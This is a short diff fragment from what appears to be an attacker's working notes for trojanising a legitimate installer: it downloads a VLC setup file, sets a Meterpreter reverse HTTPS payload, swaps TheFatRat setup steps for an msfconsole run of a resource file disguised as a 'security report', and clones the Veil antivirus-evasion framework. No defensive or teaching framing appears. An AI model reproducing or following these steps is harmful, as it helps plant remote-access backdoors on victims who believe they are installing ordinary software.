@@ -18,12 +18,8 @@ wget https://get.videolan.org/vlc/3.0.20/win64/vlc-3.0.20-win64.exe -O vlc_setup
 set PAYLOAD windows/x64/meterpreter/reverse_https
 
 
-git clone https://github.com/Screetsec/TheFatRat.git
-cd TheFatRat
-chmod +x setup.sh && sudo ./setup.sh
+msfconsole -r relatorio_seguranca.rc
 
-
-sudo ./fatrat
 
 git clone https://github.com/Veil-Framework/Veil.git
 
